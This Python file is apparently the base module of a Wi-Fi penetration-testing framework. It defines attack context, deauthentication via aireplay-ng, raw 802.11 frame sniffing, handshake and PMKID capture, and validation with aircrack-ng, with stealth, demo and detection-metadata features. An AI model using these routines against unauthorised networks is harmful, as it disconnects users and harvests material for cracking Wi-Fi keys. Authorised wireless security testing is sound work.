# SPDX-License-Identifier: Apache-2.0 OR BSD-3-Clause
"""Attack framework: shared context, deauth support and result objects."""

from __future__ import annotations

import abc
import contextlib
import glob
import os
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, Optional

from ..config import Config
from ..deps import registry
from ..events import EK
from ..models import (STATUS_FAILED, STATUS_SKIPPED, STATUS_SUCCESS, AccessPoint,
                      Attempt, Capture)
from ..session import Session
from ..util import Process, mac_norm, run

# --------------------------------------------------------------------------- #


def _payload(extra: Optional[Dict[str, Any]], more: Dict[str, Any]) -> Dict[str, Any]:
    """Merge a payload dict with keyword extras into one flat dictionary.

    Both spellings are used in the attack modules (``extra={...}`` for a survey
    result, keyword extras for a single value), and nesting one inside the other
    would surprise every reader of an event, so they are flattened here.
    """
    payload: Dict[str, Any] = dict(extra or {})
    payload.update(more)
    return payload


@dataclass
class AttackOutcome:
    status: str
    result: str = ""
    detail: str = ""
    capture: Optional[Capture] = None
    deauths: int = 0
    extra: Dict[str, Any] = field(default_factory=dict)

    @property
    def ok(self) -> bool:
        return self.status == STATUS_SUCCESS

    @classmethod
    def success(cls, result: str, capture: Optional[Capture] = None, detail: str = "",
                deauths: int = 0, extra: Optional[Dict[str, Any]] = None,
                **more) -> "AttackOutcome":
        return cls(STATUS_SUCCESS, result, detail, capture, deauths,
                   _payload(extra, more))

    @classmethod
    def failed(cls, result: str, detail: str = "", deauths: int = 0,
               extra: Optional[Dict[str, Any]] = None, **more) -> "AttackOutcome":
        return cls(STATUS_FAILED, result, detail, None, deauths,
                   _payload(extra, more))

    @classmethod
    def skipped(cls, result: str, detail: str = "") -> "AttackOutcome":
        return cls(STATUS_SKIPPED, result, detail)


#: Demo simulations report the *simulated* duration but must not burn it in
#: wall-clock.  They used to sleep 0.25-0.4 s per progress tick for the
#: whole simulated window (a real 8-12 s per flood), which cost the test
#: suite minutes and made demo campaigns crawl.  Demo loops now run
#: DEMO_TICKS progress ticks of DEMO_TICK_SECONDS each (~0.25 s wall) and
#: report the simulated window as the duration.  One place to tune.
DEMO_TICKS = 8
DEMO_TICK_SECONDS = 0.03


@dataclass
class AttackContext:
    """Everything an attack module is allowed to touch."""

    session: Session
    config: Config
    bus: Any
    iface: Any = None                 # InterfaceManager
    scanner: Any = None               # Scanner
    radio: Any = None                 # DemoRadio (demo mode only)
    demo: bool = False
    processes: Any = None             # ProcessManager
    stop_event: Any = None            # threading.Event, set on session stop

    # -- helpers -----------------------------------------------------------
    @property
    def monitor(self) -> str:
        if self.iface is not None and getattr(self.iface, "monitor", ""):
            return self.iface.monitor
        return self.config.monitor_interface or "mon0"

    def artifact_path(self, kind: str, ap: AccessPoint, ext: str) -> str:
        stem = f"{kind}-{ap.bssid.replace(':', '')}-{int(time.time())}"
        directory = os.path.join(self.session.state_dir, kind)
        os.makedirs(directory, exist_ok=True)
        return os.path.join(directory, stem + ext)

    def loot_name(self, ap: AccessPoint, kind: str) -> str:
        return f"{kind}-{(ap.essid or 'hidden').replace(' ', '_')}-{ap.bssid.replace(':', '')}"

    def log(self, message: str, level: str = "info", **extra: Any) -> None:
        fields: Dict[str, Any] = {"bssid": getattr(self, "_bssid", "")}
        fields.update(extra)          # a per-call bssid wins over the context default
        self.bus.log(message, level=level, **fields)

    def progress(self, label: str, **fields: Any) -> None:
        self.session.set_progress(label=label, **fields)

    def want_stop(self) -> bool:
        return bool(self.stop_event is not None and self.stop_event.is_set())

    def set_channel(self, channel: int) -> None:
        if self.demo or not channel:
            return
        if self.iface is not None:
            self.iface.set_channel(channel)

    # -- deauthentication --------------------------------------------------
    def deauth(self, ap: AccessPoint, count: Optional[int] = None, broadcast: bool = False,
               client: str = "", on_line: Optional[Callable[[str], None]] = None) -> int:
        """Send a deauth burst; returns the number of frames we asked for.

        In stealth mode this is a no-op: wifipilot becomes listen-only.
        """
        if self.config.stealth:
            self.log("stealth mode: skipping deauthentication", level="debug")
            return 0
        # only transmit a deauth when an attack that is meant to use one is enabled:
        # nothing here should ever be able to deauthenticate on its own
        if not ({"handshake", "wep_ivs", "pmkid_flood", "evil_twin", "deauth_flood"}
                & set(self.config.attacks)):
            return 0
        count = count or self.config.deauth_count
        client = mac_norm(client)

        if self.demo:
            outcome = self.radio.deauth(ap.bssid, count=count, broadcast=broadcast)
            ap.deauths_sent += count
            self.session.stats.deauths += count
            self.bus.publish(EK.DEAUTH, {
                "bssid": ap.bssid, "sent": count, "client": client or "broadcast",
                "reconnected": outcome.get("reconnected", 0), "demo": True,
            })
            return count

        aireplay = registry.path("aireplay-ng")
        if not aireplay:
            self.log("aireplay-ng not available: cannot deauthenticate", level="warning")
            return 0
        self.set_channel(ap.channel)
        targets = [client] if client else (
            [c.mac for c in sorted(ap.clients.values(), key=lambda c: c.signal, reverse=True)[:2]]
            if not broadcast and ap.clients else []
        )
        sent = 0
        bursts = max(1, int(self.config.deauth_burst))
        for index in range(bursts):
            if self.want_stop():
                break
            target_list = targets or [""]
            for target in target_list:
                args = [aireplay, "--deauth", str(count), "-a", ap.bssid]
                if target:
                    args += ["-c", target]
                args += [self.monitor]
                result = run(args, timeout=25)
                sent += count
                if on_line and result.text:
                    on_line(result.text.splitlines()[-1] if result.lines else "")
                if result.error:
                    self.log(f"aireplay-ng error: {result.error}", level="warning")
                    return sent
                if "No such device" in result.text or "monitor mode" in result.text.lower():
                    self.log(f"aireplay-ng: {result.first_line()}", level="warning")
            ap.deauths_sent += count
            self.session.stats.deauths += count
            self.bus.publish(EK.DEAUTH, {
                "bssid": ap.bssid, "sent": count,
                "client": ", ".join(targets) or "broadcast",
            })
            if index < bursts - 1 and not self.want_stop():
                self._sleep(self.config.deauth_interval)
        return sent

    def _sleep(self, seconds: float) -> bool:
        """Interruptible sleep; returns False when the session was stopped."""
        deadline = time.time() + seconds
        while time.time() < deadline:
            if self.want_stop():
                return False
            time.sleep(0.2)
        return True

    # -- live observation --------------------------------------------------- #
    def listen(self, seconds: float = 5.0, limit: int = 0, channel: int = 0):
        """Yield what the monitor interface sees for up to ``seconds``.

        An attack that has to *observe* an answer (did the client leave? did the AP
        reply to that association? did anything notice the flood?) cannot use
        airodump-ng's CSV: it needs the frames themselves, now.  This opens one
        ``AF_PACKET`` socket, parses every frame in Python and yields small dicts
        (``kind``, ``addr1``/``addr2``/``addr3``, ``bssid``, ``station``, ``payload``,
        ``fields``).  Real mode only — demo runs simulate the observation instead.
        """
        import socket as _socket

        from ..pcap import _strip_radiotap
        from .frames import parse_80211

        if self.demo:
            return
        interface = self.monitor
        if not interface:
            return
        try:
            sock = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW,
                                  _socket.htons(3))
            sock.bind((interface, 0))
        except (OSError, AttributeError) as exc:
            self.log(f"cannot listen on {interface}: {exc}", level="warning")
            return
        self.set_channel(channel)
        deadline = time.time() + max(0.5, seconds)
        seen = 0
        try:
            sock.settimeout(0.25)
            while time.time() < deadline and not self.want_stop():
                try:
                    packet = sock.recv(4096)
                except _socket.timeout:
                    continue
                except OSError:                      # pragma: no cover - link down
                    break
                frame = _strip_radiotap(packet)
                if len(frame) < 10:
                    continue
                parsed = parse_80211(frame)
                if parsed is None:
                    continue
                seen += 1
                yield parsed
                if limit and seen >= limit:
                    break
        finally:
            with contextlib.suppress(Exception):
                sock.close()

    def capture_window(self, seconds: float, path: str = "", channel: int = 0,
                       prefix: str = "window") -> str:
        """Take a bounded capture of the current channel and return the file.

        airodump-ng is preferred (it keeps beacon metadata in the same file); tcpdump
        is the fallback, and a machine with neither returns an empty string rather
        than pretending.  The file is written under the session's state directory.
        """
        if self.demo:
            return ""
        airodump = registry.path("airodump-ng")
        tcpdump = registry.path("tcpdump")
        if not airodump and not tcpdump:
            return ""
        stem = path or os.path.join(self.session.state_dir, "captures",
                                    f"{prefix}-{int(time.time())}")
        os.makedirs(os.path.dirname(stem), exist_ok=True)
        self.set_channel(channel)
        if airodump:
            args = [airodump, "-w", stem, "--output-format", "pcap", "-I", "1",
                    "--band", "bg", self.monitor]
        else:
            args = [tcpdump, "-i", self.monitor, "-w", stem + ".pcap", "-s", "0",
                    "-U"]
        proc = Process(args, name="capture-window")
        proc.start()
        if proc.error:
            return ""
        try:
            self._sleep(float(seconds))
        finally:
            with contextlib.suppress(Exception):
                proc.stop()
        candidates = [stem + ".pcap", stem + "-01.cap"]
        candidates += sorted(glob.glob(stem + "-*.cap")) + sorted(glob.glob(stem + "*.pcap"))
        for candidate in candidates:
            if os.path.exists(candidate) and os.path.getsize(candidate) > 0:
                return candidate
        return ""

    # -- capture validation ------------------------------------------------
    def validate_capture(self, path: str, kind: str = "") -> "tuple[bool, str, Any]":
        """Verify a capture with our own parser, and with aircrack-ng when present."""
        from ..pcap import analyze_file
        analysis = None
        summary = ""
        try:
            analysis = analyze_file(path)
            if analysis.error:
                summary = analysis.error
            else:
                bits = []
                if analysis.has_handshake:
                    best = analysis.best_handshake()
                    bits.append(f"handshake(EAPOL {best.eapol_count if best else '?'})")
                if analysis.has_pmkid:
                    bits.append(f"PMKID x{len(analysis.pmkids)}")
                if analysis.wep_data:
                    bits.append(f"WEP data {analysis.wep_data}")
                summary = ", ".join(bits) or "no frames of interest"
        except Exception as exc:  # pragma: no cover
            summary = f"parse error: {exc}"

        valid = bool(analysis and analysis.valid)
        if self.config.check_handshakes and kind in ("handshake", "pmkid"):
            aircrack = registry.path("aircrack-ng")
            if aircrack and kind == "handshake":
                result = run([aircrack, path], timeout=45)
                if "No networks found" in result.text:
                    valid = valid and False
                if "0 handshake" in result.text:
                    valid = valid and False
                elif "handshake" in result.text:
                    valid = True
                if result.lines:
                    summary = f"{summary} | aircrack: {result.lines[-1][:80]}"
        return valid, summary, analysis


# --------------------------------------------------------------------------- #
# base class
# --------------------------------------------------------------------------- #


class Attack(abc.ABC):
    name: str = "attack"
    label: str = "Generic attack"
    tool: str = ""
    description: str = ""
    requires: tuple = ()              # capability flags from registry.capabilities()
    needs_injection: bool = True
    applies_to: tuple = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN")

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True                      # the simulated radio provides everything
        caps = registry.capabilities()
        return all(caps.get(flag, False) for flag in self.requires)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        if ctx.demo:
            return ""
        caps = registry.capabilities()
        missing = [flag for flag in self.requires if not caps.get(flag, False)]
        return f"missing capability: {', '.join(missing)}" if missing else ""

    #: the metadata category/noise/impact, overridable per class but normally taken
    #: from :mod:`wifipilot.attacks.meta` (which validate() checks against the registry)
    category: str = ""
    noise: str = ""
    impact: str = ""

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in self.applies_to

    # -- shared plumbing every attack gets --------------------------------- #
    @property
    def meta(self) -> Dict[str, str]:
        from .meta import meta_for
        return meta_for(self.name, category=self.category, noise=self.noise,
                        impact=self.impact)

    def budget(self, ctx: AttackContext, default: float = 60.0) -> float:
        """How long this attack is allowed to run: the config's answer or a default.

        The preset speed levers live here so every attack obeys them for free:
        ``budget_scale`` shrinks (or stretches) every budget and ``attack_cap``
        is the hard ceiling no single attack may exceed.
        """
        try:
            seconds = ctx.config.attack_timeout_for(self.name)
        except Exception:                                    # pragma: no cover - defensive
            seconds = 0.0
        seconds = float(seconds or default)
        scale = float(getattr(ctx.config, "budget_scale", 1.0) or 1.0)
        if scale > 0 and scale != 1.0:
            seconds = seconds * scale
        cap = float(getattr(ctx.config, "attack_cap", 0.0) or 0.0)
        if cap > 0:
            seconds = min(seconds, cap)
        return max(1.0, seconds)

    def finding(self, ctx: AttackContext, ap: AccessPoint, title: str, detail: str,
                severity: str = "info", kind: str = "") -> None:
        """Record a finding once per attack/BSSID, with the attack's own kind by default."""
        from .wpa3 import _add_finding_once
        _add_finding_once(ctx, {"kind": kind or self.name, "severity": severity,
                                "title": title, "detail": detail}, ap.bssid)

    def skip_if(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                reason: str) -> Optional[AttackOutcome]:
        """Close an attempt that decided not to act; returns the outcome or None."""
        if not reason:
            return None
        ctx.session.end_attempt(attempt, "skipped", reason)
        return AttackOutcome.skipped(reason, f"{ap.display_name}: {reason}")

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """A reason to skip before doing anything, or an empty string."""
        return ""

    @abc.abstractmethod
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        ...

    # shared helper: finish an attempt with a capture
    def _succeed(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                 kind: str, path: str, tool: str, result: str, detail: str = "",
                 deauths: int = 0, valid: bool = True, eapol: int = 0,
                 extra: Optional[Dict[str, Any]] = None) -> AttackOutcome:
        saved = ctx.session.save_artifact(path, kind, ctx.loot_name(ap, kind))
        capture = Capture(kind=kind, bssid=ap.bssid, essid=ap.essid, path=saved,
                          valid=valid, tool=tool, eapol=eapol,
                          size=os.path.getsize(saved) if os.path.exists(saved) else 0,
                          extra=extra or {})
        if os.path.exists(path) and saved != path:
            capture.extra.setdefault("raw", path)
        ctx.session.add_capture(capture)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, result, detail, capture)
        return AttackOutcome.success(result, capture, detail, deauths, **(extra or {}))

    def _fail(self, ctx: AttackContext, attempt: Attempt, result: str, detail: str = "",
              deauths: int = 0) -> AttackOutcome:
        ctx.session.end_attempt(attempt, STATUS_FAILED, result, detail)
        return AttackOutcome.failed(result, detail, deauths)


# --------------------------------------------------------------------------- #
# every outcome, described the same way
# --------------------------------------------------------------------------- #


def stamp_outcome(outcome: Optional[AttackOutcome], module: "Attack", ap: AccessPoint,
                  ctx: AttackContext, seconds: float = 0.0) -> Optional[AttackOutcome]:
    """Fill one attack's outcome with the facts every report needs.

    Called by the engine for *every* attack, so nothing has to remember to add the
    category, the noise, the Blue-Team sentence or where the attack ran: an attack
    module only describes what it found.  A failure without an explanation also gets
    the module's own ``unavailable_reason`` attached, which is the difference between
    "it did not work" and "the tool is not installed".
    """
    if outcome is None:
        return None
    meta = module.meta
    extra = outcome.extra if outcome.extra is not None else {}
    extra.setdefault("attack", module.name)
    extra.setdefault("label", module.label)
    extra.setdefault("tool", module.tool)
    extra.setdefault("category", meta.get("category", ""))
    extra.setdefault("category_label", meta.get("category_label", ""))
    extra.setdefault("noise", meta.get("noise", ""))
    extra.setdefault("impact", meta.get("impact", ""))
    extra.setdefault("detection", meta.get("detection", ""))
    extra.setdefault("offline", not module.needs_injection)
    extra.setdefault("requires", list(module.requires))
    extra.setdefault("target", {"bssid": ap.bssid, "essid": ap.essid,
                                "channel": ap.channel, "encryption": ap.encryption,
                                "signal": ap.signal, "band": ap.band})
    if seconds:
        extra.setdefault("elapsed", round(seconds, 2))
    if not outcome.detail and not outcome.ok:
        reason = module.unavailable_reason(ctx)
        if reason:
            outcome.detail = reason
    outcome.extra = extra
    return outcome
